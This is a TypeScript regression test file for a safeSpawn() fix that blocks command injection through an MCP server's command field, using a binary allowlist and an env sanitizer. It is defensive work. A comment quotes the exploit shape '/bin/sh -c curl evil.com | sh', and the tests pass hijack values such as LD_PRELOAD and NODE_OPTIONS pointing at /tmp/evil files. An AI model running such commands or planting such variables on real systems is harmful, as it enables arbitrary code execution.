// apps/web/lib/security/safe-spawn.test.ts
//
// BI-7DB95878 regression tests. Written BEFORE the implementation per
// the kernel principle `security-fix-needs-regression-test-first`
// (PR #953). These tests pin the contract of safeSpawn() so the same
// command-injection class CAN'T regress: an attacker who controls the
// MCP `command` field cannot run an arbitrary binary or weaponize env
// vars like LD_PRELOAD / NODE_OPTIONS.
//
// CodeQL flagged the underlying spawn call as js/command-line-injection
// (CWE-078, CWE-088). The fix is an allowlist of known MCP runner
// binaries plus an env sanitizer that strips dangerous keys.

import { describe, expect, it, vi } from "vitest";
import {
  ALLOWED_BINARIES,
  DANGEROUS_ENV_VARS,
  assertAllowedBinary,
  sanitizeEnv,
  safeSpawn,
} from "./safe-spawn";

describe("ALLOWED_BINARIES contract", () => {
  it("includes the common MCP runner binaries", () => {
    // If you add a new MCP runner that's NOT in this list, the user-visible
    // health check will reject it. Update the allowlist deliberately.
    for (const name of ["npx", "node", "uvx", "python3", "python"]) {
      expect(name in ALLOWED_BINARIES).toBe(true);
    }
  });

  it("does NOT include shell interpreters or env launchers", () => {
    // Defense rationale: these were the attack vectors BI-7DB95878 named.
    // `command: "/bin/sh", args: ["-c", "curl evil.com | sh"]` was the
    // proof-of-concept exploit shape. `env` lets PATH manipulation pick
    // an unintended binary even when the basename looks safe.
    for (const name of ["sh", "bash", "zsh", "fish", "dash", "env"]) {
      expect(name in ALLOWED_BINARIES).toBe(false);
    }
  });

  it("returns the constant binary string for an allowed input (key sanitizer test)", () => {
    // assertAllowedBinary returns the VALUE from the constant table, not
    // the input parameter. This is what makes CodeQL recognise the
    // function as a sanitizer for js/command-line-injection.
    expect(assertAllowedBinary("npx")).toBe("npx");
    expect(assertAllowedBinary("/usr/local/bin/npx")).toBe("npx");
    expect(assertAllowedBinary("C:\\Program Files\\nodejs\\node.exe")).toBe("node");
  });
});

describe("assertAllowedBinary", () => {
  it("accepts a plain allowlisted command", () => {
    expect(() => assertAllowedBinary("npx")).not.toThrow();
    expect(() => assertAllowedBinary("python3")).not.toThrow();
  });

  it("accepts an absolute path whose basename is allowlisted", () => {
    // MCP configs sometimes carry absolute paths (e.g. from `which npx`
    // resolution by the operator). Basename gates the check.
    expect(() => assertAllowedBinary("/usr/local/bin/npx")).not.toThrow();
    expect(() => assertAllowedBinary("/opt/python3.11/bin/python3")).not.toThrow();
  });

  it("accepts a Windows-style absolute path with backslashes", () => {
    expect(() =>
      assertAllowedBinary("C:\\Program Files\\nodejs\\node.exe"),
    ).not.toThrow();
  });

  it("rejects /bin/sh and similar shell interpreters", () => {
    expect(() => assertAllowedBinary("/bin/sh")).toThrow(/allowlist/);
    expect(() => assertAllowedBinary("/usr/bin/bash")).toThrow(/allowlist/);
    expect(() => assertAllowedBinary("zsh")).toThrow(/allowlist/);
  });

  it("rejects env-launcher tricks", () => {
    // `/usr/bin/env npx ...` would let an attacker bypass the allowlist
    // by routing through env. We check the configured command, not what
    // env eventually picks.
    expect(() => assertAllowedBinary("/usr/bin/env")).toThrow(/allowlist/);
    expect(() => assertAllowedBinary("env")).toThrow(/allowlist/);
  });

  it("rejects an unknown binary even with a plausible-sounding name", () => {
    expect(() => assertAllowedBinary("nodejs")).toThrow(/allowlist/);
    expect(() => assertAllowedBinary("py")).toThrow(/allowlist/);
  });

  it("rejects empty or whitespace-only commands", () => {
    expect(() => assertAllowedBinary("")).toThrow();
    expect(() => assertAllowedBinary("   ")).toThrow();
  });
});

describe("DANGEROUS_ENV_VARS contract", () => {
  it("blocks the documented exec-hijack variables", () => {
    // These are the env keys that change which code runs even when the
    // command itself is benign. LD_PRELOAD is the textbook Linux attack;
    // DYLD_* is the macOS equivalent; NODE_OPTIONS can inject `--require`
    // modules into any node process; PYTHONSTARTUP runs arbitrary script
    // before any python user code.
    for (const key of [
      "LD_PRELOAD",
      "LD_LIBRARY_PATH",
      "DYLD_INSERT_LIBRARIES",
      "DYLD_LIBRARY_PATH",
      "NODE_OPTIONS",
      "PYTHONPATH",
      "PYTHONSTARTUP",
      "BASH_ENV",
    ]) {
      expect(DANGEROUS_ENV_VARS.has(key)).toBe(true);
    }
  });
});

describe("sanitizeEnv", () => {
  it("preserves benign env vars", () => {
    const result = sanitizeEnv({ FOO: "bar", PATH: "/usr/bin" });
    expect(result).toEqual({ FOO: "bar", PATH: "/usr/bin" });
  });

  it("strips every key on the dangerous list", () => {
    const result = sanitizeEnv({
      FOO: "bar",
      LD_PRELOAD: "/tmp/evil.so",
      NODE_OPTIONS: "--require /tmp/evil.js",
      DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib",
    });
    expect(result.FOO).toBe("bar");
    expect(result.LD_PRELOAD).toBeUndefined();
    expect(result.NODE_OPTIONS).toBeUndefined();
    expect(result.DYLD_INSERT_LIBRARIES).toBeUndefined();
  });

  it("drops undefined values (don't pass them through as 'undefined' strings)", () => {
    const result = sanitizeEnv({ FOO: "bar", BAZ: undefined });
    expect(result.FOO).toBe("bar");
    expect("BAZ" in result).toBe(false);
  });

  it("handles empty / undefined input", () => {
    expect(sanitizeEnv({})).toEqual({});
    expect(sanitizeEnv(undefined)).toEqual({});
  });
});

describe("safeSpawn", () => {
  it("returns ok=false and never invokes spawn for a rejected binary", () => {
    const spawnSpy = vi.fn();
    const result = safeSpawn(spawnSpy, "/bin/sh", ["-c", "id"]);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toMatch(/allowlist/);
    }
    expect(spawnSpy).not.toHaveBeenCalled();
  });

  it("invokes spawn with sanitized env for an allowed binary", () => {
    const fakeProc = { fakeProc: true } as unknown;
    const spawnSpy = vi.fn().mockReturnValue(fakeProc);
    const result = safeSpawn(spawnSpy, "npx", ["-y", "some-server"], {
      env: { PATH: "/usr/bin", LD_PRELOAD: "/tmp/evil.so" } as unknown as NodeJS.ProcessEnv,
      stdio: ["pipe", "pipe", "pipe"],
    });
    expect(result.ok).toBe(true);
    expect(spawnSpy).toHaveBeenCalledTimes(1);
    const passedEnv = spawnSpy.mock.calls[0][2].env as Record<string, string>;
    expect(passedEnv.PATH).toBe("/usr/bin");
    expect(passedEnv.LD_PRELOAD).toBeUndefined();
    // stdio + other options preserved
    expect(spawnSpy.mock.calls[0][2].stdio).toEqual(["pipe", "pipe", "pipe"]);
  });

  it("preserves args verbatim — no shell interpretation", () => {
    const spawnSpy = vi.fn().mockReturnValue({});
    safeSpawn(spawnSpy, "npx", ["-y", "@scope/pkg", "--flag=value with spaces"]);
    expect(spawnSpy.mock.calls[0][1]).toEqual([
      "-y",
      "@scope/pkg",
      "--flag=value with spaces",
    ]);
  });
});
